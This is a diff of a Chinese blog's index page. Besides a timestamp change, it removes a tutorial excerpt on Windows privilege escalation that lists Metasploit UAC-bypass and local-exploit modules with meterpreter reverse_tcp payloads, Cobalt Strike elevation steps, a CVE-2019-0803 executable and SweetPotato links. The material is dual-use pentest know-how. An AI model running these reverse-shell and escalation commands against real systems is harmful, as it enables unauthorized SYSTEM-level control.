@@ -222,7 +222,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-07-26 21:58:16 / 修改时间：22:03:30" itemprop="dateCreated datePublished" datetime="2022-07-26T21:58:16+08:00">2022-07-26</time>
+              <time title="创建时间：2022-07-26 21:58:16 / 修改时间：22:05:44" itemprop="dateCreated datePublished" datetime="2022-07-26T21:58:16+08:00">2022-07-26</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -267,47 +267,14 @@
 <p>该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。 </p>
 <p>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
 </blockquote>
-<h5 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC:"></a>bypassUAC:</h5><p>UAC：用户帐户控制（User Account Control），是在Windows Vista及更高版本操作系统中采用的一种控制机制，它以预见的方式阻止不必要的系统范围更改 </p>
-<p>getsystem提权方式对于普通用户来说是失败的不可正常执行的，那么这种情况下就需要绕过系统UAC来进行 getsystem提权</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进程注入</span></span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> target <span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> LHOST=<span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line"><span class="built_in">set</span> session <span class="number">7</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/1.png"></p>
-<p>进入meterpreter后输入，成功能够获取system权限</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/2.png"></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#内存注入</span></span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line"><span class="built_in">set</span> payload windows/<span class="number">86</span>/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST=<span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line"><span class="built_in">set</span> session <span class="number">2</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment">#Eventvwr注册表项</span></span><br><span class="line">use exploit/windows/local/bypassuac_eventvwr</span><br><span class="line"><span class="comment">#COM处理程序劫持</span></span><br><span class="line">use exploit/windows/local/bypassuac_comhijack</span><br></pre></td></tr></table></figure>
-
-<h5 id="kernel漏洞提权"><a href="#kernel漏洞提权" class="headerlink" title="kernel漏洞提权"></a>kernel漏洞提权</h5><p>搜索</p>
-<blockquote>
-<p> windows-kernel-exploits(Windows平台提权漏洞集合) </p>
-<p> <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> SESSION <span class="number">1</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/3.png"></p>
-<h5 id="unquoted-service-path"><a href="#unquoted-service-path" class="headerlink" title="unquoted_service_path"></a>unquoted_service_path</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/unquoted_service_path</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/4.png"></p>
-<h5 id="service-permissions"><a href="#service-permissions" class="headerlink" title="service_permissions"></a>service_permissions</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/service_permissions</span><br><span class="line"><span class="built_in">set</span> sessions <span class="number">1</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/5.png"></p>
-<h5 id="always-install-elevated"><a href="#always-install-elevated" class="headerlink" title="always_install_elevated"></a>always_install_elevated</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/always_install_elevated</span><br><span class="line"><span class="built_in">set</span> sessions <span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="0x01-CobaltStrike提权模块"><a href="#0x01-CobaltStrike提权模块" class="headerlink" title="0x01 CobaltStrike提权模块"></a>0x01 CobaltStrike提权模块</h3><h5 id="beacon-Elevate"><a href="#beacon-Elevate" class="headerlink" title="beacon - Elevate"></a>beacon - Elevate</h5><p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/6.png"></p>
-<h5 id="自用提权exe"><a href="#自用提权exe" class="headerlink" title="自用提权exe"></a>自用提权exe</h5><p>CS上传文件</p>
-<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/7.png"></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exexut <span class="literal">-Hc</span> <span class="operator">-f</span> CVE<span class="literal">-2019</span><span class="literal">-0803</span>.exe</span><br></pre></td></tr></table></figure>
-
-<h5 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="literal">-import</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/8.png"></p>
-<h5 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h5><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/Tycx2ry/SweetPotato_CS">https://github.com/Tycx2ry/SweetPotato_CS</a></p>
-</blockquote>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/07/26/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
   <div>
